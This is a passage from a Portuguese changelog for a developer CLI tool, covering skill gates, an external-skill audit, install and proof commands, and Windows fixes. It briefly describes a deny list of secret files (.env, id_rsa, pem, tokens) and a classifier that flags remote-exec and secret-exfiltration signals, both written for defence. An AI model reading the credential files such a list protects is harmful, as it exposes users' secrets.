- **`scripts/command-lint.mjs`** + `npm run lint:commands` + step no CI (`test.yml`
  job `lint`): falha o build se um README citar comando inexistente; avisa (sem
  bloquear) sobre divergência de comandos entre README.md e README.en.md.

## [3.98.0] - 2026-07-08

### Vendoring pipeline de skills externas (PRD34 F6-B / PRD29 29.10)

- **`src/skills/vendor.js`** (`gstack.skill-vendor-plan.v1` +
  `gstack.skill-vendor.v1`): `vendorSkillName`/`vendorTargetDir`,
  `buildVendorPlan` (a partir da auditoria F6-A → plano por skill),
  `renderVendorPlanMarkdown`. **Invariantes:** `avoid` NUNCA é vendado;
  mapeamento gate+agente é OBRIGATÓRIO (`canApply` só com todas mapeadas); toda
  skill vendada nasce `status: advisory`, `test: missing` (só vira enforced com
  teste próprio). PURO/testável.
- **`skills vendor import --path <mirror> [--source] [--map <file>] [--apply] [--json]`**:
  **dry-run é o default seguro** (grava só `.gstack/research/vendor-plan.{json,md}`,
  nada em `skills/`); `--apply` (após mapear tudo) escreve
  `skills/vendor/<source>/<skill>/{SKILL.md,vendor.json}` com license/hash/provenance.

## [3.97.0] - 2026-07-08

### Auditoria read-only de skills externas (PRD34 F6-A / PRD29 29.5)

- **`src/skills/external-audit.js`** (`gstack.external-skills-audit.v1`):
  `classifyExternalFile` (adopt/adapt/avoid por sinal de risco — destrutivo/
  exec-remoto/exfiltração de secret/instalação → **avoid**; hook/rede/bloco de
  comando → **adapt**; declarativo → **adopt**), `auditExternalSkills` (conta,
  provenance, guardrails read-only), `renderAuditMarkdown`. PURO/testável.
- **`research skills audit --path <dir> | --repo <url> [--json]`**: audita um
  MIRROR read-only e grava `.gstack/research/external-audit.{json,md}`. `--repo`
  é opt-in (rede) e faz clone raso com hooks desabilitados. **NUNCA executa
  script do repo externo, NUNCA instala, NUNCA lê `.env`.** Skill externa é
  REFERÊNCIA, nunca dependência runtime.
- **`research`** classificado como KNOWLEDGE no firewall (`command-layers.js`).

## [3.96.0] - 2026-07-08

### Skill Drift & Safety Doctor (PRD34 F5-D / PRD29 29.7)

- **`src/skills/drift-doctor.js`** (`gstack.skill-drift-doctor.v1` +
  `gstack.skill-baseline.v1`): `computeBaseline` (hash por skill do catálogo),
  `diffBaseline` (added/removed/drifted/unchanged), `citedCommands`/`staleCommands`
  (skill que cita comando inexistente no CLI — validado contra o firewall
  Knowledge/Execution real; separador horizontal + frontmatter strip evitam
  falso-positivo de prosa), `scanRisk` (alto/médio do catálogo), `runDriftDoctor`
  (agrega: **stale reprova sempre** — a doc engana o usuário; **drift só reprova em
  `--strict`**; risk é informativo). PURO/testável.
- **`skills baseline [--json]`**: grava `.gstack/skills/baseline.json` (hash por skill).
- **`skills doctor [--strict] [--json]`**: agora inclui `drift`/`stale`/`risk` além
  dos findings do catálogo, mantendo o contrato antigo (`ok`/`findings`).

## [3.95.0] - 2026-07-08

### Harness Skill Gate Projection (PRD34 F5-C / PRD29 29.6)

- **`src/skills/harness-projection.js`** (`gstack.harness-gate-projection.v1`):
  `gateEvent` (fallback → `ship`/`pre-write`), `projectGate` (nível REAL de
  enforcement por harness), `buildHarnessProjection` (matriz gate × harness),
  `projectionSummary`, `renderHarnessProjectionMarkdown`. **Honestidade de
  enforcement:** gate `advisory` é sempre advisory; gate `blocking` em evento SHIP
  é `enforced` em todo harness (a CLI roda verify/proof); gate `blocking` em evento
  PRE-WRITE só é `enforced` onde o harness intercepta a escrita (hook pre-tool) —
  hoje só o Claude; nos demais é `advisory` (nunca finge que bloqueia); harness
  desconhecido é `unsupported`. PURO/testável.
- **`skills harness [--harness <nome>] [--json]`**: projeta os `SKILL_GATES` reais
  e grava `.gstack/skills/harness-projection.{json,md}` (project-scoped). Mostra o
  enforcement REAL, não o prometido.

## [3.94.0] - 2026-07-08

### Contrato canônico de agentes (PRD34 F5-B / PRD29 29.9)

- **`src/skills/agents-canonical.js`** (`gstack.agents-canonical.v1`): `classifyAgent`
  (role default; router/pack por `kind` ou sufixo), `buildCanonicalContract` (conta
  papéis **MEDIDO**, não hardcoded; routers/packs NÃO contam; aliases source→canônico),
  `findOrphans` (papel sem adapter / adapter sem papel). PURO/testável.
- **`agents list --canonical`**: papéis canônicos medidos + órfãos; grava
  `.gstack/agents/canonical.{json,md}` (project-scoped). Normaliza o descompasso
  "20 fonte + 22 adapters vs 21".

## [3.93.0] - 2026-07-08

### Skill Evidence Ledger + release gate por skill-gate P0 (PRD34 F5-A / PRD29 29.4)

- **`src/skills/evidence.js`** (`gstack.skill-evidence.v1`): `recordSkillEvidence`
  (provas tipadas question/file/command/screenshot/verify/proof por run),
  `readSkillEvidence`, `evaluateSkillGateRelease` (varre `.gstack/runs/*` por
  skill-gate P0 pendente — violação registrada ou `design-system-gate` blocked).
  PURO/testável, verifier determinístico.
- **`proof` ganha o check `skillGates`**: release FALHA (entra nos blockers) se
  houver skill-gate P0 pendente em qualquer run — a evidência prova, não a memória.

## [3.92.0] - 2026-07-08

### Sprint Closeout Snapshot (PRD34 F4-B / PRD28 28.8)

- **`src/skills/sprint-snapshot.js`** (`gstack.sprint-snapshot.v1`): `saveSprintSnapshot`
  grava `.gstack/sprints/<id>/summary.md` + `closeout.json` (reusa o contrato de closeout
  F4-A). `nextSession.readFirst` orienta a próxima sessão; estado do grafo declarado
  (fresh → sem ação; senão → ação `graphify update .`). PURO/testável.
- **`sprint --save`**: grava o snapshot SEMPRE (best-effort, antes do hook legado
  `post_sprint.py` que passa a ser opcional).

## [3.91.0] - 2026-07-08

### Run Closeout Sync — helper único de fechamento (PRD34 F4-A / PRD28 28.7 + PRD32 §6)

- **`src/skills/closeout.js`** (`gstack.closeout.v1`): `runCloseoutSync({cwd,runId,
  command,status,changed,refresh})` grava `runs/<runId>/closeout.{json,md}` e roda um
  refresh BOUNDED opcional. best-effort: refresh que falha vira `degraded` honesto —
  NUNCA esconde a falha, nunca lança. PURO/testável.
- **Wiring no pipeline**: `start` (via run-loop) fecha cada run com o closeout unificado;
  o mesmo helper é a base p/ delegate/workflow/orchestrate/task/dream/verify/proof.

## [3.90.0] - 2026-07-08

### FastContext Confidence Gate — remoto opt-in (PRD34 F3-D / PRD28 28.9 + PRD32 §7)

- **`src/skills/context-confidence.js`** (`gstack.context-policy.v1`):
  `aggregateConfidence` (top-5), `loadContextPolicy` (default seguro `ask` + remoto
  OFF), `resolveEnhancement`, `remoteAllowed`. PURO/testável.
- **Política `.gstack/context-policy.json`**: `disabled` · `ask` · `project_auto` ·
  `local_only`. Backend **remoto é opt-in EXPLÍCITO** (`allowRemote:true` + backend)
  — nunca default. Sem TTY em `ask` → `needs_user_confirmation` (não chuta).
- **`scout`** agora expõe `contextConfidence` agregado; **`tools readiness`** ganha
  detector read-only `fastContext` (mode + remote disabled_default/opt_in_enabled).
- Invariantes: nunca lê `.env*`, nunca extrai key, nunca registra MCP global.

## [3.89.0] - 2026-07-08

### Parallel preflight + proof offer no start (PRD34 F3-C / PRD28 28.3+28.5)

- **`src/skills/parallel-preflight.js`** (`gstack.parallel-preflight.v1`):
  `analyzeParallelSafety` (Kahn p/ ciclo) classifica em `parallel_safe` ·
  `mixed_waves` · `sequential_required` · `cycle_error`. Frase honesta —
  não promete paralelismo total quando há `dependsOn`.
- **`orchestrate --parallel`**: nota honesta do que o paralelismo REALMENTE fará;
  ciclo de dependência bloqueia com ação.
- **`start --proof`**: roda o proof determinístico (`--profile release`) no fim do
  pipeline (runner injetável), anexando o resultado ao contrato do start.

## [3.88.0] - 2026-07-08

### Delegate guiado + preflight model/quota/budget (PRD34 F3-B / PRD28 28.1+28.4)

- **`src/skills/model-preflight.js`** (`gstack.model-preflight.v1`): `--model auto`
  resolve por `--effort` (low→haiku / medium→sonnet / high→opus); classifica o
  estado em 4 — `known` · `unknown` · `unavailable` · `user_capped`. `unknown` NÃO
  bloqueia (não dá pra verificar → segue com aviso); `unavailable`/`user_capped`
  bloqueiam com ação. PURO/testável.
- **Budget de `.gstack/loop-budget.json`**: `cappedModels` (opt-out de modelo),
  `maxDelegationsPerDay` (cota diária via `withinBudget`).
- **`delegate` wiring**: novo `--effort`, gate de modelo antes de tocar em worktree
  (bloqueia cedo, barato); gates de entrada agrupados em `runEntryGates`.

## [3.87.0] - 2026-07-08

### Context Pack compartilhado + guard no-double-context (PRD34 F3-A / PRD28 28.2+28.6)

- **`src/skills/context-pack.js`** (`gstack.context-pack.v1`): `buildContextPack`
  (exclui secrets via `isSecretPath` — .env/secrets/pem/key/id_rsa/token adjacente
  a separador; token accounting `isEstimate:true`), `contextPackState`
  (missing/stale/fresh por mtime vs grafo), `evaluateDoubleContextGuard`,
  `generateSharedPack`. PURO/testável.
- **Pack por run**: cada run grava `runs/<runId>/context-pack.json` (contexto
  compartilhado p/ subtarefas — evento no journal).
- **Guard no-double-context em `orchestrate --parallel`**: paralelizar sem pack
  fresco faz cada subtarefa re-extrair o mundo. Fallback `generate_or_block`: gera
  o pack compartilhado do grafo e segue; sem como gerar, bloqueia com ação.

## [3.86.0] - 2026-07-08

### Loop Router — start classifica o modo de execução (PRD34 F2-C / PRD32 §14)

O leigo não sabe se o pedido é "um app", "um fluxo com fases", "uma tarefa
iterativa" ou "vários agentes em paralelo". O `start` agora infere:

- **`src/skills/loop-router.js`** (`gstack.loop-decision.v1`): classifica a intenção
  em 6 modos — `knowledge_only` · `replit_pipeline` · `workflow_graph` ·
  `task_worktree_loop` · `meta_harness_parallel` · `delegate_single_harness` —
  cada um mapeado ao comando GStack que o implementa. PURO/testável.
- **Prioridade honesta**: flag `--loop <mode>` > sinais da intenção > palpite
  default. `confidence` (high/medium/none) e `alternatives` no registro.
- **Nunca chuta**: em contexto NÃO-interativo AMBÍGUO (palpite, sem flag),
  `resolveLoopDecision` devolve `needs_user_confirmation` + JSON acionável com os
  6 modos reais — não escolhe por conta própria.
- **Loop Decision Record** persistido em `plans/<id>/loop-decision.json` e
  `runs/<runId>/loop-decision.json` (+ evento no journal). `start` é o
  `replit_pipeline`; quando a intenção casa melhor com outro modo, sugere o comando.

## [3.85.0] - 2026-07-08

### Design System Gate universal + pre-write skill gates (PRD29 29.3 + PRD28 28.11 + PRD34 F2-B)

O mandato de design system deixa de ser só do hook Python do Claude e vira um
gate **universal** na CLI (vale para qualquer harness):

- **`src/skills/design-system.js`** (`gstack.design-system.v1` + `.gate.v1`):
  `isUiWrite` (tsx/jsx/css/components/pages/app), `resolveDesignSystem` (status
  canônico complete/generated/bypassed/missing), `evaluatePreWriteGate` (bloqueia
  escrita de UI sem DS), `persistGateEvidence`. PURO/testável (io injetável).
- **Artefato canônico `.gstack/design-system.json`**: importa o `session_state.json`
  legado uma vez e **sincroniza de volta** — o hook Python continua coerente e agora
  também **honra o artefato canônico** (precedência sobre o legado).
- **`start` bloqueia ANTES de escrever**: objetivo frontend sem DS → execução
  recusada (`guarded: "design-system-gate"`), `plans/<id>/skill-gate-violations.json`
  + `runs/<runId>/design-system-gate.json` (contrato requiredEvidence da matriz).
- **`--design-system <caminho|none>`**: registra o DS próprio, ou `none` = opt-out
  explícito (PRD32 Q2). `--dry-run` reporta o status do gate **sem escrever nada**
  (`importLegacy:false`).

## [3.84.0] - 2026-07-08

### Intent→Skill Route no start + 2 bugs reais de UX (PRD29 29.2 + PRD28 28.10 + PRD34 §2)

O `start` agora DECLARA a rota de skills antes de confirmar:

- **Detectores de capacidade** (`src/skills/route.js`): touchesFrontend/Data/
  Secrets/Deploy/ExternalApi/Parallel sobre objetivo+template+intent;
  `gstack.skill-route.v1` com selectedSkills (dos gates aplicáveis da matriz),
  blockingGates, requiredQuestions e modelIntake.
- **Pergunta de modelo existente** (interativo, quando frontend): screenshot/
  Figma/template/planilha/schema/OpenAPI/brand/app existente — registrada como
  `modelIntake.sources`; `--yes`/`--assume-no-existing-model` = `explicitly_skipped`
  com autor do skip. Flags `--skills a,b` têm precedência total (`user_flag`).
- **Persistência**: `plans/<id>/skill-route.json` + `runs/<runId>/skill-route.json`
  (+ evento `skill_route_declared` no journal) — `skillsUsed` não depende mais da
  memória do agente.
- **BUG FIX (real em TTY)**: `select()` retorna a STRING da opção, não índice —
  o workspace guard do v3.80.0 comparava com índice e a opção "Criar novo projeto"
  não continuava o wizard. Normalização `choiceIndex` + testes agora usam o
  CONTRATO REAL (fakes numéricos só como retrocompat explícita).
- **BUG FIX (hang real)**: `start "obj" --yes` ainda perguntava o MODO via select
  interativo (contradiz `--yes`; pendurava sem TTY). Agora `--yes` = zero
  perguntas: usa o modo recomendado do recipe.
- **BUG FIX (hang não-TTY)**: a pergunta de modelo/intake (e o workspace guard)
  chamavam `select` real quando frontend + interativo sem `--yes`; num contexto
  sem TTY (CI/pipe/background) e sem `select` injetado isso pendurava no stdin
  para sempre (0% CPU). Helper `canPromptSelect` degrada honesto — `modelIntake`
  vira `explicitly_skipped(non_interactive)` e o guard segue para o wizard em vez
  de travar. Só pergunta quando há como responder (TTY real OU select do chamador).
- **Catálogo lê o PACOTE** (lição CM-08): default root das skills = raiz do
  pacote (skills vêm com o produto); cwd vazio do usuário dava rota vazia.

## [3.83.0] - 2026-07-07

### Skill Gate Compiler (PRD29 Sprint 29.1)

A skill aconselha; o gate decide. A matriz de gates por fase agora é compilada
e validada contra o catálogo real (29.0):

- **`gstack_vibehard skills gates show [--phase <fase>] [--json]`** →
  `.gstack/skills/gate-matrix.{json,md}` (`gstack.skill-gate-matrix.v1`).
- **Mapa manual dos 12 gates P0/P1** (classificador automático só sugere):
  cwd-health, plan-before-code, existing-model-intake, design-system,
  visual-validation, secret-deny, db-migration, rls, worktree-required,
  context-pack-required, verify-proof, skill-route (advisory até o wiring 29.2).
  Gates já implementados apontam `implementedBy` (workspace classifier v3.80,
  proof v3.78, delegate --worktree).
- **Precondições machine-checkable** (`caminho in valorA|valorB`); **conflito**
  (mesmo path, conjuntos disjuntos, mesma fase) reprova a compilação (exit 1).
- Skill citada que não existe no catálogo = warning (não bloqueia). Verifier
  SEMPRE determinístico — teste garante que nenhum gate usa LLM como decisor.
- Alias de fase (`frontend`→`design-ui`, `db`→`data-auth-api`, `ship`→`ship-closeout`).

## [3.82.0] - 2026-07-07

### Skill Catalog determinístico (PRD29 Sprint 29.0)

Fundação da camada Skill Gates: as skills versionadas viram inventário
máquina-legível — a contagem é MEDIDA (213 hoje), nunca assumida.

- **`gstack_vibehard skills catalog [--json]`** → `.gstack/skills/catalog.{json,md}`
  (`gstack.skill-catalog.v1`): hash sha256/provenance por skill, pack derivado
  do caminho (skills/, agent-packs/<p>, agents, agents-generated/<harness>),
  frontmatter ausente detectado (10 hoje), classificação inicial pelas 10 fases
  do SDLC, sinais de risco por conteúdo (nunca executa nada).
- **`gstack_vibehard skills doctor [--strict]`**: frontmatter ausente/descrição
  vazia (warning), id duplicado no mesmo pack (problem, ok:false), comandos de
  risco (info). `--strict` reprova com warnings.
- **Firewall**: `skills` é camada KNOWLEDGE — nunca edita fonte; grava só
  artefatos `.gstack/` (mesmo padrão do context index). Scanner lê SOMENTE
  SKILL.md — teste com armadilha prova que `.env*` jamais é aberto.

## [3.81.0] - 2026-07-07

### README dual-core: leigo primeiro, engenheiro depois (PRD30 Sprints 30.1+30.2)

O README raiz virou porta de entrada de produto (inspiração: organização de
superfície do ECC — não a engenharia dele):

- **Primeiras 40 linhas 100% sem jargão**: "Em uma frase" + "Comece sem medo"
  com comando seguro acima da dobra e frase de desfazer.
- **"Se você é iniciante"**: tabela Quero→Rode→O que acontece (6 trilhas, cada
  uma com efeito declarado); `doctor node` como resposta a problema de npm.
- **"O que o GStack nunca faz sem você pedir"**: bloco de confiança explícito.
- **"Tradução sem jargão"**: gate/harness/worktree/MCP/proof explicados antes
  de qualquer uso técnico.
- Seções dev (6 comandos da trilha) e engenheiro (capacidades reais + links)
  DEPOIS da parte leiga — honestidade preservada (Headroom callable_not_routed,
  enforcement real vs instrucional, "não elimina alucinação").
- **Bug corrigido**: a seção "Comece honesto em 3 comandos" mandava o usuário
  rodar `node src/index.js ...` (comando de dev do repo) — removida.
- 162 linhas (limite do PRD: 220).

## [3.80.0] - 2026-07-07

### Trilha do usuário leigo: CWD guard + Node/npm health (PRD28 Sprint 28.0)

Correção da causa raiz do teste real de máquina limpa: o usuário caiu em
`npm install` / `npm install react` / `npm run dev` em `C:\Users\Windows`
porque nada classificou ONDE ele estava antes de orientar.

- **Workspace classifier** (`src/runtime/workspace.js`): `home_or_wrong_cwd` |
  `empty_git_repo` | `gstack_project` | `node_app` | `empty_dir` | `unknown` —
  cada estado com próximas ações GStack (**nunca** npm cru).
- **`start` com guard interativo**: no home pergunta criar/abrir/diagnosticar;
  em repo Git vazio pergunta scaffold-aqui/nova-pasta; pasta neutra e projeto
  existente seguem direto (zero fricção nova).
- **`dev` fora de projeto**: diagnóstico acionável pelo classifier (o que o
  diretório é + trilha correta) em vez de um aviso seco.
- **`doctor node [--json]`** (`src/installer/node-health.js`): Node presente NÃO
  significa npm saudável — trio node/npm/npx + **smoke test em tempdir**
  (nunca cria package.json no home), registry como degraded (não blocker),
  `npm.cmd`/`npx.cmd` via cmd.exe no Windows (imune a ExecutionPolicy do npm.ps1).
- **Install preflight**: `runtime npm`/`runtime npx` entram nas deps obrigatórias
  do Full (probe leve; smoke completo vive no doctor).
- **Tradutor de erros npm**: ENOENT package.json, missing script, npm.ps1
  bloqueado, rede/timeout → diagnóstico + próxima ação de produto.
- **Next-step contract**: `create` grava `.gstack/NEXT_STEPS.md` e a mensagem
  final aponta `gstack_vibehard dev` (não mais `pnpm dev` cru).

## [3.79.3] - 2026-07-07

### CI cross-OS verde de verdade + motivo do Obsidian não é mais engolido

Auditoria "o prometido foi entregue?" achou o workflow **Test falhando no GitHub
desde o primeiro push** (local sempre verde — era drift de expectativa do CI):

- **`agent-packs/` entrou no `files` do package**: a fonte dos Skill Packs não viajava
  no tarball → `agents check` acusava drift DENTRO do pacote publicado (e2e cross-OS).
- **e2e-lifecycle com expectativa dinâmica**: comparava `REAL === 18` hardcoded (score
  real evoluiu para 20); agora o contrato é o verdadeiro — **tarball == repo** + zero
  PLACEBO.
- **coverage functions 71.96% < 72%** no runner: +2 testes de render (proof humano,
  audit-only humano) → **72.61%**.
- **Obsidian: motivo da falha reportado** (era `catch {}` mudo): agora o degraded diz
  se foi `winget/brew não encontrado no PATH` ou `exit N: <stderr>` — diagnóstico real
  para o usuário (achado da máquina limpa). MOM segue macOS-only por design (upstream
  só distribui via Homebrew tap).
- Validado local: e2e lifecycle 12/12 ✓ (tarball com packs, sem drift), coverage exit 0.

## [3.79.2] - 2026-07-07

### `proof` calibrado pela máquina limpa REAL (transcript v3.79.1 do usuário)

O transcript confirmou TODOS os fixes do 26.A (zero mojibake, sem wrap, plugins
OpenCode atualizados, estado por harness, Obsidian como warning + "Instalacao
Concluida!"). O `proof` em `C:\Users\Windows` expôs 3 calibrações:

- **dream audit do proof media o CWD, não o produto**: rodar `proof` no HOME auditava
  `C:\Users\Windows` (0 REAL / 1 RISK falso). Agora audita o **package root** do gstack
  (default do auditor), com `scope` declarando o alvo. Resultado na máquina do usuário:
  20 REAL / 1 PARTIAL / 0 RISK.
- **`graphify absent` não bloqueia mais**: fora de projeto/sem grafo é estado honesto —
  vira **warning com ação** (`graphify index .`); `stale` continua **blocker** (grafo
  existente e desatualizado mentiria).
- **Headroom global reconhecido**: sem venv do projeto, o probe agora tenta `headroom`
  no PATH — instalado globalmente ⇒ `callable_not_routed` (scope global), não mais
  `missing` falso.
- Testes `proof_release` (+2: absent=warning, dream=package root). QG strict **0**.

## [3.79.1] - 2026-07-06

### Gate final PRD26: `install --audit-only --json` vira JSON PURO

O gate final (§10 do PRD26: "JSON puro em comandos --json") pegou a violação: o
audit-only imprimia banner/sections antes do payload. Agora `--json` emite **apenas**
`gstack.install-audit.v1` `{readOnly, impact[], predictedDegradations[], supplyChain}`
— o plano completo de escrita ANTES de instalar, consumível por automação (era o
pedido do CM-01 §26.0 "expor plano --json"). `install()` decomposto (cc≤6).
Teste no `install_enduser_round` (+1).

## [3.79.0] - 2026-07-06

### Fechamento do produto para o usuário final (PRD 26 Sprint 26.C)

Docs públicas alinhadas ao caminho de usuário: **start → dev → proof → uninstall**.

- **`docs/guides/quickstart.md`**: `proof --json` como passo 3 ("está pronto?" em um
  comando); `context scout` como caminho recomendado de economia de contexto; termos
  novos no glossário inline — **routed × callable** e **enforced × advisory** (nunca
  vendido como Zero-Trust).
- **`README.md`**: passo 5 do começo-sem-medo é o `proof`; seção de verificação separa
  o veredito do USUÁRIO (`gstack_vibehard proof`) da prova do DESENVOLVEDOR
  (`npm run proof`).
- **`docs/guides/capabilities.md`**: `proof` na camada real; `clean-machine` documenta
  `mode: simulated_offline`.
- Fecha o escopo ENTRA do PRD26 (26.A instalador + 26.B proof/readiness + 26.C docs);
  o backlog consciente (26.2-auto, 26.3, 26.5, 26.6, 26.7, 26.9) fica registrado como
  pós-fechamento. QG strict **0 blocking**, lint+typechecks verdes.

## [3.78.0] - 2026-07-06

### `gstack_vibehard proof` — o veredito único de produto (PRD 26 Sprint 26.B)

- **`proof [--profile release|full|quick] [--json]`** (novo comando): a resposta única
  para "pode publicar/entregar?" — agrega os gates que JÁ existem (verify, dream audit,
  tool readiness, graphify freshness, headroom claim, git tree) num veredito
  `gstack.proof.v1` `{ready, blockers[], warnings[], checks{}}`. Não reimplementa
  nenhum gate — compõe e decide; exit 0 só com `ready:true`. Classificado como
  EXECUTION no firewall (spawna suítes, como o verify).
- **Timeout ≠ missing no readiness** (falso negativo medido pela revisão do PRD26):
  probe com `ETIMEDOUT` re-tenta **1×**; persistindo, o status é **`timeout_degraded`**
  (nunca `missing`) com descrição acionável. O `proof` converte em warning explícito.
- **CM-08**: `dream audit` ganha `scope` (`target: gstack_package|directory`,
  `packageName`) — auditar o pacote instalado ≠ auditar um projeto local, declarado.
- Testes `proof_release` (6: verde/stale/timeout/blocked+CLI/readiness-retry/scope).
  QG strict **0 blocking**, lint+typechecks verdes.

## [3.77.0] - 2026-07-06

### Instalador de usuário final (PRD 26 Sprint 26.A — fecha CM-01/04/05/07/09)

- **[CM-04] Fim do mojibake no Windows**: o transcript real provou que o `chcp` por
  subprocesso "dava certo" (exit 0) mas o PS 5.1 seguia renderizando `â•”` e
  `InstalaÃ§Ã£o`. Agora a codepage efetiva é **verificada de volta** (só confia em
  unicode com 65001 CONFIRMADO) e, no fallback, **`asciiSafe`** translitera TODO o
  output centralmente via `color()` — box→`+`, `✓`→`OK`, `⚠`→`!`, acentos→letras base
  (`Instalação`→`Instalacao`). Nenhum caminho de print escapa.
- **[CM-01] Preflight-first para deps obrigatórias do Full**: antes, o install
  confirmava, ESCREVIA global e só no fim reprovava o contrato. Agora
  `predictFullDegradations` sonda os toolchains (bun/uv/pip/python) **antes do
  confirm** — se algo degradaria, exige `--allow-degraded` (ou aponta `--skip-deps`/
  `--project-only`) **com zero escrita**. Falha TARDIA imprevista declara
  `partial_with_restore_available` e aponta **`uninstall --restore-only`**.
- **[CM-05] Estado por harness legível**: sumário final com razão única por harness
  (`hooks reais / instrucional / plugins / detecção / já instalado (ATUALIZADOS) /
  pulado`) — install e doctor param de se contradizer.
- **[CM-07] Printing Press declarado on-demand** (fora do contrato Full) no preflight.
- **[CM-09] `tools clean-machine` reporta `mode: "simulated_offline"`** + nota
  apontando `tools readiness` como o estado real da máquina.
- Testes `install_enduser_round` (7). QG strict **0 blocking**, lint+typechecks verdes.

## [3.76.0] - 2026-07-06

### 3 achados do install na máquina limpa REAL (upgrade 3.21.1→3.75.0)

O teste de usuário real expôs 3 problemas no `install` completo — todos corrigidos:

- **[P1] `headroom wrap` REMOVIDO do install**: o wrap muda config de harness FORA do
  manifest do gstack (na máquina limpa, o instalador rtk do headroom chegou a registrar
  hooks no Claude Code do usuário antes de falhar — escrita global não rastreada que o
  uninstall não restauraria). Routing agora é EXCLUSIVAMENTE opt-in e project-scoped:
  `tools headroom enable --harness codex|claude --project-only` (reversível). Guard de
  fonte no teste impede regressão.
- **[P2] Harness "já instalado" agora atualiza artefatos gerenciados**: os plugins
  OpenCode ficavam na versão antiga para sempre (doctor: "Plugins gstack: nenhum"
  mesmo após upgrade — o harness era pulado por inteiro e nem aparecia no menu).
  Novo `refreshOpenCodePlugins` (manifest-owned, idempotente, NUNCA toca
  `opencode.json`/`.jsonc`) roda em todo install/upgrade; diagnóstico aponta
  `--reinstall` para reaplicar tudo.
- **[P3] Componente OPCIONAL degradado não reprova o contrato Full**: o install
  inteiro terminava com `✗ Contrato Full NÃO cumprido` porque o `winget install
  Obsidian` falhou — sendo o vault markdown funcional e o componente opcional.
  `trackDegraded(..., { optional: true })` → warning explícito; componentes
  obrigatórios continuam bloqueando (e opcional não dilui obrigatório).
- Testes `install_findings_round` (4) + `full_contract` (+1) + regressões opencode
  verdes. QG strict **0 blocking** (installOpenCode decomposto cc≤6).

## [3.75.0] - 2026-07-06

### `npm run proof` — prova de máquina limpa em um comando

Script executável para o teste de aceite em máquina limpa (`scripts/clean-machine-proof.mjs`):
roda TODAS as 15 etapas em ordem (stress EBUSY 12×, suíte JS, test:py, lint, typechecks,
qg strict com validação de conteúdo, dream audit 0-RISK, readiness, conformance strict,
agents --check, **verify release READY**, test:pack, clean-machine, uninstall dry-run),
imprime placar PASS/FAIL e grava `.gstack/reports/clean-machine-proof.json`. Exit 0 só
com tudo verde — nenhuma etapa vira skip silencioso. Em falha, salva o **log completo**
da etapa (`proof-fail-<etapa>.log`) e extrai as linhas relevantes (not ok/Error/EBUSY),
não a última linha qualquer. Config: `GSTACK_PROOF_E2E_ROUNDS`,
`GSTACK_VERIFY_TEST_TIMEOUT_MS`.

## [3.74.1] - 2026-07-06

### Determinismo EBUSY no Windows — 2 bugs reais no cleanup (3ª revisão externa)

O EBUSY reapareceu no `verify release` do revisor com diagnóstico "logs presos:
(nenhum listável)" — que expôs **dois bugs de verdade** no hardening anterior:

1. **PIDs lidos DEPOIS do stop**: `stopCommand` limpa o state; o cinto-e-suspensório
   do cleanup lia `readAllState` após o stop e o `waitPidsExit` esperava em **lista
   vazia**. Agora os PIDs são **capturados ANTES** do stop e esperados de verdade.
2. **Probe por arquivo de log não detecta handle de DIRETÓRIO**: o handle preso era
   cwd de filho/AV na árvore, não um log listável. `waitDirRenameable` — renomear o
   **diretório inteiro** só funciona quando NENHUM handle está aberto em qualquer
   ponto da árvore (detector determinístico mais forte do Windows) — substitui o
   probe por arquivo.
3. **Produto (`runtime-supervisor.js`)**: `stop` e `dev --force` agora esperam
   **TODOS** os pids do state, não só status `"stopped"` — um `already-gone` pode
   ainda estar em teardown de handles (isAlive filtra os mortos de graça).

Diagnóstico de falha enriquecido (pids capturados/vivos pós-wait/vivos agora +
sobras). Asserções intactas. Stress: `runtime_e2e` **12×12 PASS, zero EBUSY**;
supervisor 18/18; QG strict 0 findings.

## [3.74.0] - 2026-07-06

### Prova operacional fechada (revisão 9.2/10) — verify calibrado, dívida baselineada, test:py limpo

Fecha os 4 pontos da segunda revisão externa:

- **`verify --profile release` não reprova mais suíte VERDE por duração**: o step
  `test` tinha teto de 300s, mas a suíte completa (680+ testes com E2Es que spawnam
  processos reais) passa disso em máquina fria — `timed_out` era falso-negativo.
  Teto calibrado para **900s** + override `GSTACK_VERIFY_TEST_TIMEOUT_MS`
  (`src/project-plan/verify-runner.js`). Não mascara: asserção quebrada falha rápido.
- **Dívida QG baselineada formalmente**: os ~27 achados não-bloqueantes (MODERATE +
  cobertura) viraram **backlog consciente** — baselines Fallow regeneradas
  (`.fallow-baselines/`, README com data/contexto). `qg --strict` agora reporta
  **0 findings / 0 auto-fixable** para código inalterado; débito NOVO continua falhando.
- **`test:py` sem ruído**: `scripts/test-py.mjs` (novo) — probe silencioso de pytest;
  fallback para unittest SÓ quando pytest está ausente (falha real de teste propaga,
  nunca re-roda). Fim do "No module named pytest" aparente-erro.
- **Graphify fresh no carimbo final**: `tools refresh` roda pós-merge (grafo no HEAD
  final); quando ficar stale, o readiness já aponta `recommendedAction` (v3.69).
- **Headroom**: claim já correto — "disponível e **opt-in**", nunca "ativo por padrão"
  (`docs/guides/capabilities.md` §Headroom); sem mudança.

## [3.73.0] - 2026-07-06

### Rodada de hardening de produção (revisão pós-PRD25) — 4 fixes confirmados + 1 causa raiz descoberta

Revisão externa apontou 7 achados; cada um foi **verificado empiricamente** antes de
agir. Confirmados e corrigidos:

- **`test:py` (drift de contrato, era tido como "ambiental")**: o fixture fakeava só o
  `npx`, mas `qg.py::_resolve_fallow` prefere binário `fallow` local/global — rodando
  via npm, o fallow REAL era achado antes do fake. `_write_fake_launchers` agora fakeia
  **npx E fallow** (ordem de resolução real sob teste). **Python 67/67** (era 62+2 fail).
- **Stop hook Unicode-safe**: `safe_write_text` (UTF-8 `errors="replace"`) nos writes de
  chronicle (`stop.py:522/817`) — surrogate solto no transcript não derruba mais o hook
  nem perde memória. Teste novo `test_stop_unicode_safe` (3, com guard anti-regressão).
- **DEP0190 eliminado**: probes de `readiness.js`/`refresh.js` não passam mais array de
  args com `shell:true` — para shims `.cmd`/`.bat` a string de comando é montada
  **explicitamente com quoting** (args são literais fixos). `tools readiness` roda
  **sem warning de segurança**.
- **runtime_e2e resiliente a EBUSY**: além do retry existente, `waitLogsReleased` —
  espera **determinística** de liberação de handle (probe de rename por arquivo de log,
  orçamento 6s) antes do rm. Asserções intactas (pids mortos, remoção sem EBUSY).
  **8×8 PASS** no loop.
- **BÔNUS (causa raiz da intermitência do gate)**: `subprocess.run(text=True)` sem
  `encoding=` decodifica com **cp1252** no Windows — byte 0x8d do output UTF-8 do
  fallow matava o reader thread e o QG virava `tool_missing` intermitente. TODOS os
  `text=True` de `qg.py` (2) e `stop.py` (18) agora usam `encoding="utf-8",
